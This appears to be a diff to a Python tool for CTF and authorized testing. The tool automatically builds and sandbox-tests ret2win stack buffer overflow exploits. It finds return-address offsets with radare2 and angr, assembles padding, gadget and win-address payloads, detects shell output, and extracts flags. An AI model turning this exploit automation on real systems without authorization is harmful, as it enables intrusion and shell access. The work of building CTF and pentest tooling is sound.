@@ -8,6 +8,7 @@ For a binary with a gift/win function reachable through a stack overflow, this:
 This turns "reachability verified" into "exploit verified". For AUTHORIZED targets / CTF."""
 from __future__ import annotations
 
+import json
 import os
 import re
 import shutil
@@ -146,6 +147,67 @@ def _docker_run(binary: str, payload: bytes) -> (bool, str):
             pass
 
 
+def _static_offset(binary: str) -> Optional[int]:
+    """Offset a la direccion de retorno guardada para el caso clasico de buffer de pila, SIN
+    ejecutar: la variable local (base rbp) mas profunda de la funcion que llama a un sink de
+    lectura, mas 8 (rbp guardado). Robusto donde la ejecucion simbolica de angr se equivoca."""
+    try:
+        import r2pipe
+        r = r2pipe.open(binary, flags=["-2"])
+        r.cmd("aaa")
+        fns = json.loads(r.cmd("aflj") or "[]")
+        read_sinks = ("read", "gets", "fgets", "scanf", "isoc99_scanf", "recv", "fread", "gets_s")
+        best = None
+        for fn in fns:
+            name = fn.get("name", "")
+            dis = r.cmd(f"pdf @ {name}") or ""
+            if not any(s in dis for s in read_sinks):
+                continue
+            vs = json.loads(r.cmd(f"afvj @ {name}") or "{}")
+            for v in vs.get("bp", []):
+                off = (v.get("ref") or {}).get("offset")
+                if isinstance(off, int) and off < 0:
+                    cand = -off + 8
+                    if best is None or cand > best:
+                        best = cand
+        r.quit()
+        return best
+    except Exception:
+        return None
+
+
+def _offset_candidates(binary: str, offset: Optional[int]) -> list:
+    """Offsets a probar, en orden. Si el usuario da uno, solo ese. Si no, combina angr y el
+    metodo estatico (r2), descartando valores absurdos (<=0, el 0 bogus que a veces da angr)."""
+    if offset is not None:
+        return [offset]
+    cands = []
+    for fn in (find_pc_offset, _static_offset):
+        try:
+            o = fn(binary)
+        except Exception:
+            o = None
+        if isinstance(o, int) and o > 0 and o not in cands:
+            cands.append(o)
+    return cands
+
+
+def _check_success(output: str, r: PoCResult) -> None:
+    low = (output or "").lower()
+    shelled = "___poc_shell___" in low or "uid=" in low
+    if any(m in low for m in ("win reached", "you win", "win()")) or shelled:
+        r.verified = True
+        r.stage = "verified"
+        r.notes.append("PoC ejecutado en sandbox: " +
+                       ("shell obtenida (ejecuto comandos tras el ret2win)." if shelled
+                        else "objetivo alcanzado (win)."))
+        import re as _re
+        fm = _re.search(r"[A-Za-z0-9_]+\{[^}\n]{1,80}\}", output or "")
+        if fm:
+            r.flag = fm.group(0)
+            r.notes.append("FLAG capturada: " + r.flag)
+
+
 def autopoc(binary: str, offset: Optional[int] = None, run: bool = True) -> PoCResult:
     r = PoCResult(ok=False, stage="init")
     win = find_win(binary)
@@ -155,48 +217,34 @@ def autopoc(binary: str, offset: Optional[int] = None, run: bool = True) -> PoCR
                        "prueba ROP/ret2libc.")
         return r
     r.win = win
-    if offset is None:
-        offset = find_pc_offset(binary)
-    if offset is None:
+    cands = _offset_candidates(binary, offset)
+    if not cands:
         r.stage = "no-offset"
-        r.notes.append("no se pudo determinar el offset automaticamente (angr). "
+        r.notes.append("no se pudo determinar el offset automaticamente (angr ni r2). "
                        "Pasa --offset N (hallalo con cyclic).")
-        r.win = win
         return r
-    r.offset = offset
+
     ret = find_ret_gadget(binary)
-    r.script = build_script(binary, offset, win, ret)
-
-    # concrete payload bytes
-    payload = b"A" * offset
-    if ret:
-        payload += ret.to_bytes(8, "little")
-    payload += win.to_bytes(8, "little")
-    r.payload_hex = payload.hex()
-    r.ok = True
-    r.stage = "built"
-
-    if run:
-        ran, output = _docker_run(binary, payload)
-        r.run_output = output
-        if ran:
-            low = output.lower()
-            shelled = "___poc_shell___" in low or "uid=" in low
-            if any(m in low for m in ("win reached", "you win", "win()")) or shelled:
-                r.verified = True
-                r.stage = "verified"
-                if shelled:
-                    r.notes.append("PoC ejecutado en sandbox: shell obtenida (ejecuto comandos "
-                                   "tras el ret2win).")
-                else:
-                    r.notes.append("PoC ejecutado en sandbox: objetivo alcanzado (win).")
-                import re as _re
-                fm = _re.search(r"[A-Za-z0-9_]+\{[^}\n]{1,80}\}", output)
-                if fm:
-                    r.flag = fm.group(0)
-                    r.notes.append("FLAG capturada: " + r.flag)
-            else:
-                r.notes.append("PoC ejecutado pero no se detecto el marcador de exito; revisa la salida.")
+    best: Optional[PoCResult] = None
+    for off in cands:
+        rr = PoCResult(ok=True, stage="built", win=win, offset=off)
+        rr.script = build_script(binary, off, win, ret)
+        payload = b"A" * off + (ret.to_bytes(8, "little") if ret else b"") + win.to_bytes(8, "little")
+        rr.payload_hex = payload.hex()
+        if run:
+            ran, output = _docker_run(binary, payload)
+            rr.run_output = output
+            if ran:
+                _check_success(output, rr)
+        if rr.verified or not run:
+            if len(cands) > 1 and rr.verified:
+                rr.notes.append(f"offset acertado: {off} (probados {cands}).")
+            return rr
+        best = best or rr
+    if best is not None:
+        best.notes.append(f"PoC construido pero no verificado con los offsets probados {cands}; "
+                          "revisa la salida.")
+        return best
     return r
 
 
